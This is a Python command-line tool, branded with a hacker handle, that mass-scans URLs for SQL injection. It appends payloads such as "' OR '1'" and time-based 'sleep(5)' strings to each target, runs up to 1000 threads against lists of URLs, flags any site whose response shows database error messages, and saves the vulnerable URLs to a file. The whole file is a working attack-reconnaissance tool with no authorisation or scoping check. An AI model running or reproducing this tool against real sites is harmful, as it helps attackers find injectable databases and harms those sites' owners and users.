#CODED BY Wh0l5Th3R00t

import argparse
import requests
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed

init(autoreset=True)

def main():
    print("""
     ___  ___  _    _   ___               
    / __|/ _ \| |  (_) / __| __ __ _ _ _  
    \__ \ (_) | |__| | \__ \/ _/ _` | ' \ 
    |___/\__\_\____|_| |___/\__\__,_|_||_|
           CODED BY @wh0l5th3r00t | SQLi Scan v1.0                            
    """)
    parser = argparse.ArgumentParser(description="SQL Injection scanner.")
    parser.add_argument('-f', '--file', help='File containing URLs to test')
    parser.add_argument('-u', '--url', help='Single URL to test')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use (max 1000)')
    parser.add_argument('-o', '--output', help='Output file to save results')

    args = parser.parse_args()

    payloads = ["'", "' OR '1'", "1 or sleep(5)#", "or SLEEP(5)"]
    sql_errors = ["mysql_fetch_array()", "Warning:", "Microsoft OLE DB Provider", "SQL Server error '80", "Invalid column name", "You have an error in your SQL syntax"]

    if args.file:
        scan_file(args.file, payloads, sql_errors, args.threads, args.output)
    elif args.url:
        scan_url(args.url, payloads, sql_errors, args.output)

def scan_file(file_path, payloads, sql_errors, num_threads, output_file):
    try:
        with open(file_path, 'r') as file:
            urls = file.read().strip().split('\n')
        with ThreadPoolExecutor(max_workers=min(num_threads, 1000)) as executor:
            futures = [executor.submit(scan_url, url, payloads, sql_errors, output_file) for url in urls]
            for future in as_completed(futures):
                future.result()
    except FileNotFoundError:
        print("File not found.")

def scan_url(url, payloads, sql_errors, output_file=None):
    positive_found = False
    results = []
    for payload in payloads:
        full_url = url + payload
        try:
            response = requests.get(full_url)
            if any(error in response.text for error in sql_errors):
                result = f"{Fore.LIGHTMAGENTA_EX}[{Fore.LIGHTGREEN_EX}VULNERABLE{Style.RESET_ALL}{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} {Fore.WHITE}{full_url}{Style.RESET_ALL} {Fore.YELLOW}|{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}{get_color(response.status_code)}{response.status_code}{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL}"
                results.append(full_url)
                print(result)
                positive_found = True
                break
        except requests.RequestException:
            continue

    if not positive_found:
        response = requests.get(url)
        result = f"{Fore.LIGHTMAGENTA_EX}[{Fore.YELLOW}NOT VULNERABLE{Style.RESET_ALL}{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL} {Fore.WHITE}{url}{Style.RESET_ALL} {Fore.YELLOW}|{Style.RESET_ALL} {Fore.LIGHTMAGENTA_EX}[{Style.RESET_ALL}{get_color(response.status_code)}{response.status_code}{Fore.LIGHTMAGENTA_EX}]{Style.RESET_ALL}"
        results.append(url)
        print(result)

    if output_file and positive_found:
        save_results(results, output_file)


def save_results(results, file_path):
    with open(file_path, 'a') as file:
        file.write("\n".join(results) + "\n")

def get_color(status_code):
    if 200 <= status_code < 300:
        return Fore.GREEN
    elif 300 <= status_code < 400:
        return Fore.YELLOW
    else:
        return Fore.RED

if __name__ == "__main__":
    main()
